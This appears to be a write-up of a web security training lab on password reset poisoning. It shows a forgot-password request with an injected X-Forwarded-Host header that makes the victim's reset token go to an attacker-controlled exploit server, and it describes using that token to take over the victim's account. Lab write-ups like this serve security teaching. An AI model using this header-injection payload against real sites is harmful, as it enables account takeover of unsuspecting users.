# Password Reset Poisoning via Middleware

This lab is susceptible to password reset poisoning. The user carlos is modeled to click on any link that arrives in his inbox without question.

**Goal:** Log into Carlos's account.

Login credentials for your own account: wiener:peter. Any email sent to this account can be read through the email client on the exploit server.

---

**Reference:**
- https://portswigger.net/web-security/authentication/other-mechanisms

<img width="776" height="150" alt="1" src="https://github.com/user-attachments/assets/0472536b-5a62-4242-845e-aae5ba2ef560" />


---

Requesting a password change generates a POST request:

<img width="521" height="465" alt="2" src="https://github.com/user-attachments/assets/65dd7da3-8d6f-458f-8ca6-73043d980b60" />


The link it produces is: `https://0a12001204e7e3e982ef202200a10043.web-security-academy.net/forgot-password?temp-forgot-password-token=JiMwnEiWPtqhfR5EAaUObelEM6CE11uK`:

<img width="500" height="261" alt="3" src="https://github.com/user-attachments/assets/2174d8b9-4dff-4cb3-a0b2-53a22cf14b5d" />


By adding an `X-Forwarded-Host` header, the domain embedded in that emailed link can be poisoned to point at the exploit server:

```
POST /forgot-password HTTP/2
...
X-Forwarded-Host: exploit-0a870063038466fd80799d71012c004f.exploit-server.net

username=carlos
```

<img width="1058" height="505" alt="4" src="https://github.com/user-attachments/assets/add63eda-4a41-4d92-8d6f-32441921f38b" />


As a result, a request shows up on the exploit server:

<img width="1056" height="69" alt="5" src="https://github.com/user-attachments/assets/1ef2c87d-df42-4e60-a1e7-62f290ca9406" />


This lets us use that poisoned link to set a new password for carlos:

<img width="1231" height="495" alt="6" src="https://github.com/user-attachments/assets/d1f66d90-434d-4a14-932e-efaf8814a58b" />

<img width="726" height="320" alt="7" src="https://github.com/user-attachments/assets/92416e62-9420-4864-b03a-c8a9b4af2a83" />

